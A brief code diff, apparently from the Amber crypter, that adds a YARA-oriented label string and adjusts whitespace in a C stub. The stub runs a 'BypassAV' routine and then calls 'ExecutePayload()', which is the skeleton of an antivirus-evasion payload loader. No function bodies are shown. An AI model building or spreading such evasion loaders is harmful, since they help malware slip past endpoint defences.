@@ -4,6 +4,7 @@
 #include "key.h"
 //#include "RC4.h"
 
+const char LABEL[] = {"<Amber:27a01d4772038a3f83552908e0470604e773f8af>"}; // Descriptive label for yara rules ;D
 void ExecutePayload();
 
 
@@ -11,7 +12,7 @@ int main(int argc, char const *argv[])
 {
 	CreateThread(NULL,0,BypassAV,NULL,0,NULL);
 	if(BypassAV(NULL)){
-		ExecutePayload();	
+		ExecutePayload();
 	}
 	return 0;
 }
